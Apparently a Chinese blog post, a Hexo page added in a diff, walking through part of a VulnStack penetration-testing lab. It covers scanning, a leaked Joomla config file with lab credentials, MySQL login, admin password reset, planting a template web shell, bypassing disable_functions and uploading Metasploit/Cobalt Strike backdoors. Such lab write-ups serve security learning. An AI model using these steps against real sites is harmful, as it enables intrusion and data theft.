@@ -1,0 +1,875 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Greed">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="目录[TOC] 配置建议内存130G+，我预留了120G，做到一半没内存了还要删游戏😭 攻击机   kali  靶机：  web-centos web1-ubuntu win2008(x64) win server 2012(x64) pc win7(x64)  提前开启一块网卡 VMnet2 配置ip段 192.168.93.0&#x2F;24，kali 和 web 桥接模式 网络环境外网12kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnstack靶场日记-3">
+<meta property="og:url" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/index.html">
+<meta property="og:site_name" content="Welcome to greed&#39; blog">
+<meta property="og:description" content="目录[TOC] 配置建议内存130G+，我预留了120G，做到一半没内存了还要删游戏😭 攻击机   kali  靶机：  web-centos web1-ubuntu win2008(x64) win server 2012(x64) pc win7(x64)  提前开启一块网卡 VMnet2 配置ip段 192.168.93.0&#x2F;24，kali 和 web 桥接模式 网络环境外网12kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209112545106.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209123634411.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209124336792.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209125343847.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209130254304.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209134708055.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135422451.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135525738.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135721864.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141302248.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141424058.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209143217613.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209152756012.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161456340.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161756516.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209171110248.png">
+<meta property="og:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209194319511.png">
+<meta property="article:published_time" content="2023-12-06T10:13:42.000Z">
+<meta property="article:modified_time" content="2023-12-10T07:37:17.861Z">
+<meta property="article:author" content="Greed">
+<meta property="article:tag" content="解题记录">
+<meta property="article:tag" content="学习">
+<meta property="article:tag" content="vulnstack">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://just1greed.github.io/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209112545106.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>vulnstack靶场日记-3 - Welcome to greed&#39; blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"just1greed.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>greed&#39; blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnstack靶场日记-3"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-06 18:13" pubdate>
+          2023年12月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          70 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vulnstack靶场日记-3</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：7 小时前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>[TOC]</p>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>建议内存130G+，我预留了120G，做到一半没内存了还要删游戏😭</p>
+<p>攻击机 </p>
+<ul>
+<li>kali</li>
+</ul>
+<p>靶机：</p>
+<ul>
+<li>web-centos</li>
+<li>web1-ubuntu</li>
+<li>win2008(x64)</li>
+<li>win server 2012(x64)</li>
+<li>pc win7(x64)</li>
+</ul>
+<p>提前开启一块网卡 <code>VMnet2</code> 配置ip段 <code>192.168.93.0/24</code>，kali 和 web 桥接模式</p>
+<h4 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h4><h4 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kali</span> <span class="hljs-number">192.168.1.28</span><br>web  <span class="hljs-number">192.168.1.29</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">web</span>  <span class="hljs-number">192.168.93.100</span><br>web1 <br>win2008 <span class="hljs-number">192.168.93.20</span><br>win server <span class="hljs-number">192.168.93.10</span><br>win7  <span class="hljs-number">192.168.93.30</span><br></code></pre></td></tr></table></figure>
+
+<p>黑盒渗透，不知道靶机启动密码和内网配置，以上内容只做环境配置参考</p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>目标 <code>192.168.1.29</code> , <code>nmap</code>扫开放端口 22,80,3306 </p>
+<p>访问80网页，一个博客页面<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209112545106.png" srcset="/img/loading.gif" lazyload alt="image-20231209112545106"></p>
+<p>robots.txt</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs dts">User-agent: *<br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/administrator/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/bin/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/cache/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/cli/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/components/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/includes/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/installation/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/language/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/layouts/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/libraries/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/logs/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/modules/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/plugins/</span><br><span class="hljs-symbol">Disallow:</span> <span class="hljs-keyword">/tmp/</span><br></code></pre></td></tr></table></figure>
+
+<p>点击<code>My Blog</code> 下载 <code>index.php</code> 文件，判断网站cms为 <code>joomla</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- generator=&quot;Joomla! - Open Source Content Management&quot; --&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>扫目录</p>
+<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs puppet">/1.php                 phpinfo()<br>/README.txt            确定版本为3.x<br>/web.config.txt        网站访问配置文件<br>/configuration.php~    boom！出货了<br><br>è¯·ç¨å€™è®¿é—®ã€‚<span class="hljs-string">&#x27;; public <span class="hljs-variable">$display_offline_message</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$offline_image</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$sitename</span> = &#x27;</span>test<span class="hljs-string">&#x27;; public <span class="hljs-variable">$editor</span> = &#x27;</span>tinymce<span class="hljs-string">&#x27;; public <span class="hljs-variable">$captcha</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$list_limit</span> = &#x27;</span>20<span class="hljs-string">&#x27;; public <span class="hljs-variable">$access</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug_lang</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$debug_lang_const</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$dbtype</span> = &#x27;</span>mysqli<span class="hljs-string">&#x27;; public <span class="hljs-variable">$host</span> = &#x27;</span>localhost<span class="hljs-string">&#x27;; public <span class="hljs-variable">$user</span> = &#x27;</span>testuser<span class="hljs-string">&#x27;; public <span class="hljs-variable">$password</span> = &#x27;</span>cvcvgjASD!@<span class="hljs-string">&#x27;; public <span class="hljs-variable">$db</span> = &#x27;</span>joomla<span class="hljs-string">&#x27;; public <span class="hljs-variable">$dbprefix</span> = &#x27;</span>am2zu_<span class="hljs-string">&#x27;; public <span class="hljs-variable">$live_site</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$secret</span> = &#x27;</span>gXN9Wbpk7ef3A4Ys<span class="hljs-string">&#x27;; public <span class="hljs-variable">$gzip</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$error_reporting</span> = &#x27;</span>default<span class="hljs-string">&#x27;; public <span class="hljs-variable">$helpurl</span> = &#x27;</span>https://help.joomla.org/proxy?keyref=Help&#123;major&#125;&#123;minor&#125;:&#123;keyref&#125;&amp;lang=&#123;langcode&#125;<span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_host</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_port</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_user</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_pass</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_root</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$ftp_enable</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$offset</span> = &#x27;</span>UTC<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailonline</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailer</span> = &#x27;</span>mail<span class="hljs-string">&#x27;; public <span class="hljs-variable">$mailfrom</span> = &#x27;</span>test@test.com<span class="hljs-string">&#x27;; public <span class="hljs-variable">$fromname</span> = &#x27;</span>test<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sendmail</span> = &#x27;</span>/usr/sbin/sendmail<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpauth</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpuser</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtppass</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtphost</span> = &#x27;</span>localhost<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpsecure</span> = &#x27;</span>none<span class="hljs-string">&#x27;; public <span class="hljs-variable">$smtpport</span> = &#x27;</span>25<span class="hljs-string">&#x27;; public <span class="hljs-variable">$caching</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cache_handler</span> = &#x27;</span>file<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cachetime</span> = &#x27;</span>15<span class="hljs-string">&#x27;; public <span class="hljs-variable">$cache_platformprefix</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaDesc</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaKeys</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaTitle</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaAuthor</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$MetaVersion</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$robots</span> = &#x27;</span><span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef</span> = &#x27;</span>1<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef_rewrite</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$sef_suffix</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$unicodeslugs</span> = &#x27;</span>0<span class="hljs-string">&#x27;; public <span class="hljs-variable">$feed_limit</span> = &#x27;</span>10<span class="hljs-string">&#x27;; public <span class="hljs-variable">$feed_email</span> = &#x27;</span>none<span class="hljs-string">&#x27;; public <span class="hljs-variable">$log_path</span> = &#x27;</span>/var/www/html/administrator/logs<span class="hljs-string">&#x27;; public <span class="hljs-variable">$tmp_path</span> = &#x27;</span>/var/www/html/tmp<span class="hljs-string">&#x27;; public <span class="hljs-variable">$lifetime</span> = &#x27;</span>15<span class="hljs-string">&#x27;; public <span class="hljs-variable">$session_handler</span> = &#x27;</span>database<span class="hljs-string">&#x27;; public <span class="hljs-variable">$shared_session</span> = &#x27;</span>0<span class="hljs-string">&#x27;; &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">关键信息</span><br><span class="hljs-string">public <span class="hljs-variable">$user</span> = &#x27;</span>testuser<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$password</span> = &#x27;</span>cvcvgjASD!@<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$db</span> = &#x27;</span>joomla<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$dbprefix</span> = &#x27;</span>am2zu_<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">public <span class="hljs-variable">$secret</span> = &#x27;</span>gXN9Wbpk7ef3A4Ys<span class="hljs-string">&#x27;;</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试利用上述账号密码登录失败，继续寻找</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>搜索得知，msf内置了 <code>joomla</code> 的漏洞，打开msfconsole</p>
+<p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209123634411.png" srcset="/img/loading.gif" lazyload alt="image-20231209123634411"></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use auxiliary/scanner/http/joomla_version<br><span class="hljs-built_in">set</span> rhost 192.168.1.29<br><span class="hljs-built_in">set</span> threads 100<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209124336792.png" srcset="/img/loading.gif" lazyload alt="image-20231209124336792"></p>
+<p>跟这个版本对应的只找到了一个洞，而且需要登陆后利用，到此尝试失败</p>
+<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>打不通就回到信息收集，当时开放的端口还有22和3306，我们分别用这些账号密码尝试 <code>ssh</code> 和 <code>mysql</code> 登录</p>
+<p>将上述疑似账号密码写进一个文档<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209125343847.png" srcset="/img/loading.gif" lazyload alt="image-20231209125343847"></p>
+<ol>
+<li><p>先尝试用 <code>hydra</code> 爆破 <code>ssh</code> 登录，报错了，再尝试用ssh直接连接也报错，搜索得知版本不匹配<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209130254304.png" srcset="/img/loading.gif" lazyload alt="image-20231209130254304"></p>
+</li>
+<li><p>加参数手工测试一下这几组数据，密码错误，排除 ssh 登录</p>
+</li>
+</ol>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ssh <span class="hljs-attribute">-oKexAlgorithms</span>=+diffie-hellman-group1-sha1 <span class="hljs-attribute">-oHostKeyAlgorithms</span>=+ssh-dss <span class="hljs-attribute">-oCiphers</span>=+3des-cbc testuser@192.168.1.29<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>尝试mysql连接， <code>testuser/cvcvgjASD!@</code> 登陆成功</li>
+</ol>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># terminal</span><br><span class="hljs-attribute">systemctl</span> restart mysql<br>mysql -h <span class="hljs-number">192.168.1.29</span> -utestuser -p<br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>用可视化工具连接数据库，这里使用 <a target="_blank" rel="noopener" href="https://dbeaver.io/">DBeaver Community | Free Universal Database Tool</a> 好家伙，表可真不少嘞，找找有用的信息</p>
+<p>在 <code>am2zu_users</code> 表中存有一个数据<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209134708055.png" srcset="/img/loading.gif" lazyload alt="image-20231209134708055"></p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> administrator<br><span class="hljs-symbol">password:</span> $<span class="hljs-number">2</span><span class="hljs-built_in">y</span><span class="hljs-number">$10</span><span class="hljs-number">$t1RelJijihpPhL8LARC9JuM</span>/AWrVR.nto/XycrybdRbk8IEg6Dze2<br>密码经过加密，无法直接利用，但是我们可以尝试添加一个新用户，只要能登录管理后台就能尝试上传木马<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>找到一篇 <code>joomla</code> 重置密码的文章 <a target="_blank" rel="noopener" href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">如何恢复或重置管理员密码</a> ，按照教程将管理员密码置为 <code>secret</code> ，尝试登录<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135422451.png" srcset="/img/loading.gif" lazyload alt="image-20231209135422451"><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135525738.png" srcset="/img/loading.gif" lazyload alt="image-20231209135525738">!<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209135721864.png" srcset="/img/loading.gif" lazyload alt="image-20231209135721864"></p>
+</li>
+<li><p>成功登入管理员账户，发现后台可直接修改模板文件，在任意页面添加一句话木马，蚁剑连接 <code>http://192.168.1.29/templates/beez3/error.php</code> 密码 a<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141302248.png" srcset="/img/loading.gif" lazyload alt="image-20231209141302248"><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209141424058.png" srcset="/img/loading.gif" lazyload alt="image-20231209141424058"></p>
+<p>连上后尝试执行命令失败，回到之前发现的 <code>1.php</code> ，发现 <code>disable_functions</code> <img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209143217613.png" srcset="/img/loading.gif" lazyload alt="image-20231209143217613"></p>
+<p>搜索得知，该情况可以利用黑名单中不存在的函数来执行命令，如 <code>pcntl_exec() 结合 python</code> ，也可利用 <code>LD_PRELOAD 环境变量</code> 。。。方法很多，这里直接用蚁剑的 bypass插件(下载时需要设置代理) 来实现</p>
+</li>
+</ol>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>分别在 msf 和 cs 生成后门文件，上传并执行，拿到 <code>meterpreter</code> 和 <code>cs上线</code> </p>
